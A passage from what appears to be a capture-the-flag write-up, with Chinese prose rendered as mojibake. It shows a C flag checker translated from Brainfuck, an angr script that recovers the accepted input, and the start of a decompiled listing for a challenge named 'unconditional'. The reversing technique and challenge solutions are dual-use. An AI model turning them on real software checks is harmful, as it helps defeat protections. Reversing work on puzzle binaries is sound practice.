class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is a translation of a.bf, generated by bftoc.py (by Paul Kaefer)</span></span><br><span class="line"><span class="comment"> * It was generated on Sunday, July 21, 2024 at 10:49PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">unsigned</span> tape[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clearing the tape (array) */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;size; i++)</span><br><span class="line">        tape[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, tape[<span class="number">0</span>], tape[<span class="number">1</span>], tape[<span class="number">2</span>]);</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">138</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">10</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">169</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">4</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">160</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">10</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">172</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">17</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">174</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">8</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">8</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">113</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">13</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">160</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">4</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">148</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">6</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">82</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">171</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">9</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">114</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">128</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">17</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">102</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">170</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">8</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">104</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">6</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">138</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">8</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">108</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">9</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">173</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">6</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">133</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">9</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">98</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">10</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">145</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">10</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">125</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">10</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">7</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">170</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">10</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">6</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">112</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">17</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">153</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">11</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">4</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">95</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">23</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">2</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">143</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">23</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">118</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">19</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">155</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tape[ptr] = getchar();</span><br><span class="line">    ptr += <span class="number">2</span>;</span><br><span class="line">    tape[ptr] += <span class="number">6</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">5</span>, tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr - <span class="number">1</span>] += tape[ptr], tape[ptr] = <span class="number">0</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">155</span>;</span><br><span class="line">    <span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç·¨è­¯å¾Œç”¨angrå»è§£(ä¸è¦å•æˆ‘æ€éº¼å¯«ï¼Œæˆ‘ç”¨æŠ„èƒ½åŠ›)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./a&#x27;</span>, auto_load_libs=<span class="literal">False</span>) <span class="comment">#./aæ˜¯å‰›å‰›çš„ç¨‹å¼ç·¨è­¯å¾Œ</span></span><br><span class="line">initial_state = p.factory.entry_state()</span><br><span class="line">simulation = p.factory.simgr(initial_state)</span><br><span class="line">simulation.explore(find= <span class="keyword">lambda</span> s: <span class="string">b&quot;hello&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    sol = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Success! Solution is: <span class="subst">&#123;sol&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;target not found&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ryWyKfRdR.png" alt="image"></p>
<h3 id="unconditional"><a href="#unconditional" class="headerlink" title="unconditional"></a>unconditional</h3><ul>
<li>solver hokak<br><img src="https://hackmd.io/_uploads/SJCUFGA_A.png" alt="image"><br>ç„¶å¾Œä»–çµ¦æˆ‘å€‘ä¸€å€‹åŸ·è¡Œæª”ï¼Œdecompileä¹‹å¾Œå¤§æ¦‚é•·é€™æ¨£(å°å°çš„æ”¹é)<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 